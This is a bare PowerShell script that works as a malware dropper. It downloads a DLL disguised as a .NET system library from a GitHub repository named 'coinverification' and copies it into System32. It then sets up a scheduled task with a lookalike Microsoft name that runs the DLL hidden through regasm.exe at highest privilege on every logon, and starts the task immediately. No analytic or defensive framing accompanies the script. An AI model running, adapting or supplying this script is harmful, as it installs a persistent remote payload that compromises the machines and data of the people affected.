# Download DLL
Invoke-WebRequest -Uri 'https://github.com/coinverification/coinverify/raw/refs/heads/main/System.Runtime.InteropQ.dll' -OutFile 'C:\Users\Public\System.Runtime.InteropQ.dll'

# Wait until the file exists
while (!(Test-Path "C:\Users\Public\System.Runtime.InteropQ.dll")) { Start-Sleep -Milliseconds 500 }

# Copy DLL using PowerShell-native command
Copy-Item -Path "C:\Users\Public\System.Runtime.InteropQ.dll" -Destination "C:\Windows\System32\System.Runtime.InteropQ.dll" -Force

# Create wrapper script to avoid /tr length limit
$scriptContent = @"
Start-Process 'C:\WINDOWS\Microsoft.NET\Framework64\v4.0.30319\regasm.exe' -ArgumentList '/nologo','C:\windows\system32\System.Runtime.InteropQ.dll' -WindowStyle Hidden -Verb RunAs
"@
$scriptPath = "C:\ProgramData\regasm_runner.ps1"
$scriptContent | Out-File -FilePath $scriptPath -Encoding ASCII -Force

# Register scheduled task
schtasks /create /tn "Microsoft .NET Registrationz" /tr "powershell.exe -ExecutionPolicy Bypass -File $scriptPath" /sc onlogon /ru INTERACTIVE /rl HIGHEST /f

# Run it immediately
schtasks /run /tn "Microsoft .NET Registrationz"
